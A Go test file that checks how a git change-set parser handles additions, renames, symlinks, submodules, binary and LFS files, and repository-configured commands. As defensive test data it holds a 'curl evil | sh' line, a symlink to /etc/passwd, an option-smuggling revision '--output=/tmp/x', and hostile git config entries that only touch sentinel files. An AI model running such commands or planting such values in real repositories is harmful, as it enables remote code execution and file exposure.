package changeset

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/zendern/priskinator/internal/fixture"
)

// repo is a scratch git repository for building base and head commits.
type repo struct {
	t   *testing.T
	dir string
}

func newRepo(t *testing.T) *repo {
	t.Helper()
	r := &repo{t: t, dir: t.TempDir()}
	r.git("init", "-q", "-b", "main")
	r.git("commit", "-q", "--allow-empty", "-m", "root")
	return r
}

// git runs git in the repository with an isolated, signing-free configuration.
func (r *repo) git(args ...string) string {
	r.t.Helper()
	cmd := exec.Command("git", append([]string{
		"-c", "user.name=test", "-c", "user.email=test@example.com",
		"-c", "commit.gpgsign=false", "-c", "tag.gpgsign=false",
		"-c", "core.hooksPath=/dev/null", "-c", "init.defaultBranch=main",
	}, args...)...)
	cmd.Dir = r.dir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1")
	out, err := cmd.CombinedOutput()
	if err != nil {
		r.t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
	}
	return strings.TrimSpace(string(out))
}

func (r *repo) write(path, content string) {
	r.t.Helper()
	full := filepath.Join(r.dir, path)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		r.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		r.t.Fatal(err)
	}
}

func (r *repo) commit(msg string) string {
	r.t.Helper()
	r.git("add", "-A")
	r.git("commit", "-q", "--allow-empty", "-m", msg)
	return r.git("rev-parse", "HEAD")
}

func (r *repo) evaluate(base, head string) *ChangeSet {
	r.t.Helper()
	cs, err := FromGit(context.Background(), r.dir, base, head, Options{})
	if err != nil {
		r.t.Fatalf("FromGit: %v", err)
	}
	return cs
}

func onlyFile(t *testing.T, cs *ChangeSet) File {
	t.Helper()
	if len(cs.Files) != 1 {
		t.Fatalf("got %d files, want 1: %+v", len(cs.Files), cs.Files)
	}
	return cs.Files[0]
}

func addedText(f File) []string {
	var out []string
	for _, h := range f.Hunks {
		for _, l := range h.Added {
			out = append(out, l.Text)
		}
	}
	return out
}

func removedText(f File) []string {
	var out []string
	for _, h := range f.Hunks {
		for _, l := range h.Removed {
			out = append(out, l.Text)
		}
	}
	return out
}

func TestAdded(t *testing.T) {
	r := newRepo(t)
	base := r.commit("base")
	r.write("src/app.go", "package app\n\nfunc A() {}\n")
	head := r.commit("head")

	cs := r.evaluate(base, head)
	if cs.Base != base || cs.Head != head {
		t.Errorf("Base/Head = %s/%s, want %s/%s", cs.Base, cs.Head, base, head)
	}
	f := onlyFile(t, cs)
	if f.Status != StatusAdded || f.Path != "src/app.go" || f.OldPath != "" {
		t.Errorf("file = %+v", f)
	}
	if f.OldMode != "" || f.NewMode != ModeRegular || f.Kind() != KindRegular {
		t.Errorf("modes = %q -> %q, kind %q", f.OldMode, f.NewMode, f.Kind())
	}
	if f.NewSize != 25 || f.Binary || f.LFS {
		t.Errorf("size/binary/lfs = %d/%v/%v", f.NewSize, f.Binary, f.LFS)
	}
	if got, want := addedText(f), []string{"package app", "", "func A() {}"}; !slices.Equal(got, want) {
		t.Errorf("added = %q, want %q", got, want)
	}
	if got := f.Hunks[0].Added[2].Line; got != 3 {
		t.Errorf("third added line number = %d, want 3", got)
	}
}

func TestModifiedLineNumbers(t *testing.T) {
	r := newRepo(t)
	r.write("a.txt", "one\ntwo\nthree\nfour\nfive\n")
	base := r.commit("base")
	r.write("a.txt", "one\nTWO\nthree\nfour\nfive\nsix\n")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if f.Status != StatusModified || f.OldSize != 24 || f.NewSize != 28 {
		t.Errorf("file = %+v", f)
	}
	if len(f.Hunks) != 2 {
		t.Fatalf("got %d hunks, want 2: %+v", len(f.Hunks), f.Hunks)
	}
	h := f.Hunks[0]
	if h.Removed[0] != (Line{Line: 2, Text: "two"}) || h.Added[0] != (Line{Line: 2, Text: "TWO"}) {
		t.Errorf("hunk 0 = %+v", h)
	}
	if got := f.Hunks[1].Added; len(got) != 1 || got[0] != (Line{Line: 6, Text: "six"}) {
		t.Errorf("hunk 1 added = %+v", got)
	}
	if f.AddedLines() != 2 || f.RemovedLines() != 1 {
		t.Errorf("added/removed counts = %d/%d", f.AddedLines(), f.RemovedLines())
	}
}

func TestDeleted(t *testing.T) {
	r := newRepo(t)
	r.write("tests/test_auth.py", "def test_login():\n    assert True\n")
	base := r.commit("base")
	r.git("rm", "-q", "tests/test_auth.py")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if f.Status != StatusDeleted || f.Path != "tests/test_auth.py" || f.NewMode != "" || f.OldMode != ModeRegular {
		t.Errorf("file = %+v", f)
	}
	if got := removedText(f); !slices.Equal(got, []string{"def test_login():", "    assert True"}) {
		t.Errorf("removed = %q", got)
	}
}

func TestRenamedOutOfWatchedPath(t *testing.T) {
	r := newRepo(t)
	r.write(".github/workflows/ci.yml", "on: push\njobs:\n  test:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: make test\n")
	base := r.commit("base")
	if err := os.MkdirAll(filepath.Join(r.dir, "docs"), 0o755); err != nil {
		t.Fatal(err)
	}
	r.git("mv", ".github/workflows/ci.yml", "docs/ci.yml")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if f.Status != StatusRenamed || f.OldPath != ".github/workflows/ci.yml" || f.Path != "docs/ci.yml" {
		t.Errorf("file = %+v", f)
	}
	if f.Similarity != 100 || len(f.Hunks) != 0 {
		t.Errorf("similarity %d, hunks %+v", f.Similarity, f.Hunks)
	}
	if got := f.Paths(); !slices.Equal(got, []string{"docs/ci.yml", ".github/workflows/ci.yml"}) {
		t.Errorf("Paths() = %q", got)
	}
}

func TestRenamedWithEdits(t *testing.T) {
	r := newRepo(t)
	body := strings.Repeat("line\n", 20)
	r.write("old.txt", body)
	base := r.commit("base")
	r.git("mv", "old.txt", "new.txt")
	r.write("new.txt", body+"extra\n")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if f.Status != StatusRenamed || f.Similarity == 100 || f.Similarity < 50 {
		t.Errorf("file = %+v", f)
	}
	if got := addedText(f); !slices.Equal(got, []string{"extra"}) {
		t.Errorf("added = %q", got)
	}
}

func TestCopied(t *testing.T) {
	r := newRepo(t)
	body := strings.Repeat("shared content\n", 20)
	r.write("orig.txt", body)
	base := r.commit("base")
	r.write("orig.txt", body+"changed\n")
	r.write("copy.txt", body)
	head := r.commit("head")

	cs := r.evaluate(base, head)
	var copied *File
	for i := range cs.Files {
		if cs.Files[i].Status == StatusCopied {
			copied = &cs.Files[i]
		}
	}
	if copied == nil {
		t.Fatalf("no copied file in %+v", cs.Files)
	}
	if copied.OldPath != "orig.txt" || copied.Path != "copy.txt" {
		t.Errorf("copied = %+v", copied)
	}
}

func TestTypeChangedFileToSymlink(t *testing.T) {
	r := newRepo(t)
	r.write("config.yml", "a: 1\n")
	base := r.commit("base")
	if err := os.Remove(filepath.Join(r.dir, "config.yml")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/etc/passwd", filepath.Join(r.dir, "config.yml")); err != nil {
		t.Fatal(err)
	}
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if f.Status != StatusTypeChanged || f.OldMode != ModeRegular || f.NewMode != ModeSymlink || f.Kind() != KindSymlink {
		t.Errorf("file = %+v", f)
	}
	if got := addedText(f); !slices.Equal(got, []string{"/etc/passwd"}) {
		t.Errorf("added = %q (symlink target)", got)
	}
	if got := removedText(f); !slices.Equal(got, []string{"a: 1"}) {
		t.Errorf("removed = %q", got)
	}
}

func TestSymlinkAdded(t *testing.T) {
	r := newRepo(t)
	base := r.commit("base")
	if err := os.Symlink("../.github/workflows", filepath.Join(r.dir, "wf")); err != nil {
		t.Fatal(err)
	}
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if f.Status != StatusAdded || f.Kind() != KindSymlink || f.SymlinkTarget != "../.github/workflows" {
		t.Errorf("file = %+v", f)
	}
}

func TestModeChangeOnly(t *testing.T) {
	r := newRepo(t)
	r.write("scripts/build.sh", "echo hi\n")
	base := r.commit("base")
	r.git("update-index", "--chmod=+x", "scripts/build.sh")
	r.git("commit", "-q", "-m", "chmod")
	head := r.git("rev-parse", "HEAD")

	f := onlyFile(t, r.evaluate(base, head))
	if f.Status != StatusModified || f.OldMode != ModeRegular || f.NewMode != ModeExecutable || !f.ModeChanged() {
		t.Errorf("file = %+v", f)
	}
	if len(f.Hunks) != 0 {
		t.Errorf("hunks = %+v, want none", f.Hunks)
	}
}

func TestSubmodulePointerBump(t *testing.T) {
	r := newRepo(t)
	oldSHA := strings.Repeat("a", 40)
	newSHA := strings.Repeat("b", 40)
	r.write(".gitmodules", "[submodule \"vendor/lib\"]\n\tpath = vendor/lib\n\turl = https://example.com/lib.git\n")
	r.git("add", ".gitmodules")
	// A gitlink with no checkout: commit the index directly, since add -A would drop it.
	r.git("update-index", "--add", "--cacheinfo", "160000,"+oldSHA+",vendor/lib")
	r.git("commit", "-q", "-m", "base")
	base := r.git("rev-parse", "HEAD")
	r.git("update-index", "--cacheinfo", "160000,"+newSHA+",vendor/lib")
	r.git("commit", "-q", "-m", "bump")
	head := r.git("rev-parse", "HEAD")

	f := onlyFile(t, r.evaluate(base, head))
	if f.Status != StatusModified || f.Kind() != KindSubmodule || f.NewMode != ModeSubmodule {
		t.Errorf("file = %+v", f)
	}
	if f.OldOID != oldSHA || f.NewOID != newSHA {
		t.Errorf("oids = %s -> %s", f.OldOID, f.NewOID)
	}
	if len(f.Hunks) != 0 || f.Binary {
		t.Errorf("submodule has hunks %+v or binary %v", f.Hunks, f.Binary)
	}
}

func TestSubmoduleReplacedByFile(t *testing.T) {
	r := newRepo(t)
	r.git("update-index", "--add", "--cacheinfo", "160000,"+strings.Repeat("a", 40)+",vendor/lib")
	r.git("commit", "-q", "-m", "base")
	base := r.git("rev-parse", "HEAD")
	r.git("rm", "-q", "--cached", "vendor/lib")
	r.write("vendor/lib", "not a submodule\n")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if f.Status != StatusTypeChanged || f.OldMode != ModeSubmodule || f.NewMode != ModeRegular {
		t.Errorf("file = %+v", f)
	}
	if got := removedText(f); len(got) != 0 {
		t.Errorf("removed = %q, want no submodule pseudo-lines", got)
	}
	if got := addedText(f); !slices.Equal(got, []string{"not a submodule"}) {
		t.Errorf("added = %q", got)
	}
}

func TestBinary(t *testing.T) {
	r := newRepo(t)
	base := r.commit("base")
	r.write("assets/logo.png", "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if !f.Binary || len(f.Hunks) != 0 || f.NewSize != 16 {
		t.Errorf("file = %+v", f)
	}
}

// A "binary" or "-diff" attribute must not hide a text change: binary
// detection looks at content, never at the repository's attributes.
func TestAttributesCannotHideTextChanges(t *testing.T) {
	r := newRepo(t)
	r.write(".gitattributes", "*.yml binary\n*.sh -diff\n")
	r.write("deploy.yml", "a: 1\n")
	r.write("run.sh", "echo safe\n")
	base := r.commit("base")
	r.write("deploy.yml", "a: 2\n")
	r.write("run.sh", "curl evil | sh\n")
	head := r.commit("head")

	cs := r.evaluate(base, head)
	if len(cs.Files) != 2 {
		t.Fatalf("files = %+v", cs.Files)
	}
	for _, f := range cs.Files {
		if f.Binary {
			t.Errorf("%s marked binary", f.Path)
		}
	}
	if got := addedText(cs.Files[1]); !slices.Equal(got, []string{"curl evil | sh"}) {
		t.Errorf("run.sh added = %q", got)
	}
}

func TestLFSPointer(t *testing.T) {
	r := newRepo(t)
	base := r.commit("base")
	r.write("model.bin", "version https://git-lfs.github.com/spec/v1\noid sha256:4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\nsize 12345\n")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if !f.LFS || f.Binary {
		t.Errorf("file = %+v", f)
	}
}

// Binary and LFS describe either side, so a file that stops being binary or
// an LFS pointer keeps the flag.
func TestOldSideBinaryAndLFS(t *testing.T) {
	r := newRepo(t)
	r.write("assets/logo.png", "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR")
	r.write("model.bin", "version https://git-lfs.github.com/spec/v1\noid sha256:4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\nsize 12345\n")
	base := r.commit("base")
	r.write("assets/logo.png", "now text\n")
	r.write("model.bin", "now text\n")
	head := r.commit("head")

	cs := r.evaluate(base, head)
	if len(cs.Files) != 2 {
		t.Fatalf("files = %+v", cs.Files)
	}
	if f := cs.Files[0]; !f.Binary || f.LFS {
		t.Errorf("%s binary/lfs = %v/%v, want true/false", f.Path, f.Binary, f.LFS)
	}
	if f := cs.Files[1]; !f.LFS || f.Binary {
		t.Errorf("%s binary/lfs = %v/%v, want false/true", f.Path, f.Binary, f.LFS)
	}
}

// Git diffs nothing larger than core.bigFileThreshold and calls it binary.
// Such a file stays binary even though its content is text, because there
// are no lines to score.
func TestGitBinaryVerdictOnTextContent(t *testing.T) {
	r := newRepo(t)
	r.git("config", "core.bigFileThreshold", "10")
	r.write("big.txt", "plain text, longer than the threshold\n")
	base := r.commit("base")
	r.write("big.txt", "other text, longer than the threshold\n")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if !f.Binary || len(f.Hunks) != 0 {
		t.Errorf("file = %+v, want binary with no hunks", f)
	}
}

func TestUnusualPaths(t *testing.T) {
	r := newRepo(t)
	base := r.commit("base")
	paths := []string{"dir with space/a b.txt", "tab\there.txt", "quote\"d.txt", "ünïcode.txt", "back\\slash.txt", "new\nline.txt"}
	for _, p := range paths {
		r.write(p, "x\n")
	}
	head := r.commit("head")

	cs := r.evaluate(base, head)
	var got []string
	for _, f := range cs.Files {
		got = append(got, f.Path)
		if a := addedText(f); !slices.Equal(a, []string{"x"}) {
			t.Errorf("%q added = %q", f.Path, a)
		}
	}
	slices.Sort(got)
	want := slices.Clone(paths)
	slices.Sort(want)
	if !slices.Equal(got, want) {
		t.Errorf("paths = %q, want %q", got, want)
	}
}

func TestNoNewlineAtEOF(t *testing.T) {
	r := newRepo(t)
	r.write("a.txt", "one")
	base := r.commit("base")
	r.write("a.txt", "one\ntwo")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	if got := addedText(f); !slices.Equal(got, []string{"one", "two"}) {
		t.Errorf("added = %q", got)
	}
	if got := removedText(f); !slices.Equal(got, []string{"one"}) {
		t.Errorf("removed = %q", got)
	}
}

func TestDiffLinesThatLookLikeHeaders(t *testing.T) {
	r := newRepo(t)
	r.write("a.txt", "keep\n")
	base := r.commit("base")
	r.write("a.txt", "keep\ndiff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n")
	head := r.commit("head")

	f := onlyFile(t, r.evaluate(base, head))
	want := []string{"diff --git a/x b/x", "--- a/x", "+++ b/x", "@@ -1 +1 @@"}
	if got := addedText(f); !slices.Equal(got, want) {
		t.Errorf("added = %q, want %q", got, want)
	}
}

func TestEmptyChange(t *testing.T) {
	r := newRepo(t)
	base := r.commit("base")
	head := r.commit("head")
	if cs := r.evaluate(base, head); len(cs.Files) != 0 {
		t.Errorf("files = %+v", cs.Files)
	}
}

func TestRejectsBadRevisions(t *testing.T) {
	r := newRepo(t)
	base := r.commit("base")
	for _, rev := range []string{"", "--output=/tmp/x", "HEAD~1", "main", strings.Repeat("0", 40)} {
		if _, err := FromGit(context.Background(), r.dir, base, rev, Options{}); err == nil {
			t.Errorf("head %q: want error", rev)
		}
	}
}

// Nothing the repository configures may run while the change set is built:
// external diff drivers, textconv, filters, fsmonitor, hooks, or pagers.
func TestNoRepositoryConfiguredCommandRuns(t *testing.T) {
	r := newRepo(t)
	r.write("a.txt", "one\n")
	r.write("b.bin", "\x00one")
	base := r.commit("base")
	r.write("a.txt", "two\n")
	r.write("b.bin", "\x00two")
	r.write(".gitattributes", "* diff=evil filter=evil\n")
	head := r.commit("head")

	sentinels := t.TempDir()
	touch := func(name string) string {
		return "touch " + filepath.Join(sentinels, name) + " #"
	}
	hooks := filepath.Join(r.dir, "evil-hooks")
	if err := os.MkdirAll(hooks, 0o755); err != nil {
		t.Fatal(err)
	}
	for _, h := range []string{"pre-commit", "post-checkout", "post-index-change", "reference-transaction"} {
		script := "#!/bin/sh\n" + touch("hook-"+h) + "\n"
		if err := os.WriteFile(filepath.Join(hooks, h), []byte(script), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	// Written after the commits so the test's own git calls are unaffected.
	cfg := map[string]string{
		"diff.external":           touch("external"),
		"diff.evil.command":       touch("driver-command"),
		"diff.evil.textconv":      touch("textconv"),
		"filter.evil.clean":       touch("filter-clean"),
		"filter.evil.smudge":      touch("filter-smudge"),
		"filter.evil.process":     touch("filter-process"),
		"core.fsmonitor":          touch("fsmonitor"),
		"core.hooksPath":          hooks,
		"core.pager":              touch("pager"),
		"pager.diff":              touch("pager-diff"),
		"core.sshCommand":         touch("ssh"),
		"diff.ignoreSubmodules":   "all",
		"diff.submodule":          "diff",
		"diff.orderFile":          "/nonexistent",
		"diff.noprefix":           "true",
		"diff.mnemonicPrefix":     "true",
		"diff.relative":           "true",
		"diff.renames":            "false",
		"color.diff":              "always",
		"color.ui":                "always",
		"core.quotePath":          "true",
		"diff.suppressBlankEmpty": "true",
	}
	for k, v := range cfg {
		r.git("config", k, v)
	}

	cs := r.evaluate(base, head)

	entries, err := os.ReadDir(sentinels)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		t.Errorf("repository-configured command ran: %s", e.Name())
	}
	if len(cs.Files) != 3 {
		t.Fatalf("files = %+v", cs.Files)
	}
	for _, f := range cs.Files {
		if f.Path == "a.txt" && !slices.Equal(addedText(f), []string{"two"}) {
			t.Errorf("a.txt added = %q (config changed the diff)", addedText(f))
		}
	}
}

func TestStatusesMatchFixtureFormat(t *testing.T) {
	pairs := map[Status]string{
		StatusAdded:       fixture.StatusAdded,
		StatusModified:    fixture.StatusModified,
		StatusDeleted:     fixture.StatusDeleted,
		StatusRenamed:     fixture.StatusRenamed,
		StatusCopied:      fixture.StatusCopied,
		StatusTypeChanged: fixture.StatusTypeChanged,
	}
	for got, want := range pairs {
		if string(got) != want {
			t.Errorf("status %q, fixture format uses %q", got, want)
		}
	}
}
